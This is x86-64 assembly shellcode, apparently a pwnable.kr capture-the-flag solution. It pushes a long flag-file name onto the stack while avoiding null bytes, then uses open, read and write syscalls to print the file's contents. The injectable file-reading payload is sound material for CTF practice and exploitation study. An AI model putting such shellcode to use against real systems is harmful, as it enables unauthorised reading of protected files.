SECTION .text
  global main
main:
  mov rbp, rsp; for correct debugging

  ;open longgg flag.txt file (long name >> many push & mov)
  ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  ;mov rbx, 0x676E6F306F306F ;(gives null byte so i took bigger number and sub)
  mov rbx, 0x5F73695F73696874
  mov rcx, 0x5F0BFAF042FA3805
  sub rbx, rcx  
  push rbx
  mov rbx, 0x306F306F306F306F
  push rbx
  mov rbx, 0x3030303030303030
  push rbx
  mov rbx, 0x303030306F6F6F6F
  push rbx
  mov rbx, 0x6F6F6F6F6F6F6F6F
  push rbx
  mov rbx, 0x6F6F6F6F6F6F6F6F
  push rbx
  mov rbx, 0x6F6F6F3030303030
  push rbx
  mov rbx, 0x3030303030303030 
  push rbx
  mov rbx, 0x3030303030303030
  push rbx
  mov rbx, 0x303030306F6F6F6F
  push rbx
  mov rbx, 0x6F6F6F6F6F6F6F6F
  push rbx
  mov rbx, 0x6F6F6F6F6F6F6F6F
  push rbx
  mov rbx, 0x6F6F6F6F6F6F6F6F
  push rbx
  mov rbx, 0x6F6F6F6F6F6F6F6F
  push rbx
  mov rbx, 0x6F6F6F6F6F6F6F6F
  push rbx
  mov rbx, 0x6F6F6F6F6F6F6F6F
  push rbx
  mov rbx, 0x6F6F6F6F6F6F6F6F
  push rbx
  mov rbx, 0x6F6F6F6F6F6F6F6F
  push rbx
  mov rbx, 0x6F6F6F6F6F6F6F6F
  push rbx
  mov rbx, 0x6C5F797265765F73
  push rbx
  mov rbx, 0x695F656D616E5F65
  push rbx
  mov rbx, 0x6C69665F6568745F
  push rbx
  mov rbx, 0x7972726F732E656C
  push rbx
  mov rbx, 0x69665F736968745F
  push rbx
  mov rbx, 0x646165725F657361
  push rbx
  mov rbx, 0x656C705F656C6966
  push rbx
  mov rbx, 0x5F67616C665F726B
  push rbx
  mov rbx, 0x2E656C62616E7770
  push rbx
  mov rbx, 0x5F73695F73696874
  push rbx
  ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  mov rdi, rsp
  xor rsi, rsi
  xor rdx, rdx
  xor rax, rax
  mov al, 0x2
  syscall
  
  ; read file
  xor rbx, rbx
  mov bl, al ; rbx = fd
  xor rdi, rdi
  mov dil, bl ;first argument "fd"  
  mov rsi, rsp ;second argument "buffer"
  xor rdx, rdx
  mov dl, 0x40 ;third argument "size"
  xor rax, rax ;syscall(0) = read
  syscall
  
  ; write to stdout
  ; stream of file is saved to rsi address (rsi address points to the data)
  mov dil, 0x1 ;first argument (fd = 1 = stdout)
  ;argument 2 is rsi = rsp (points to file data) arg 3 is edx (count = 0x40)
  mov al, 0x1 ; syscall(1) = write
  syscall
  
  ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  ; maybe delete it cause we in root jail!!
  ; close() the file descriptor
  ;xor rax, rax
  ;mov al, 0x3 ;syscall(3) - close
  ;xor rdi, rdi
  ;mov dil, bl ; first argument (fd)
  ;syscall 
  
  ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
  ; exit(0)
  xor rax, rax
  mov al, 60
  xor rdi, rdi
  syscall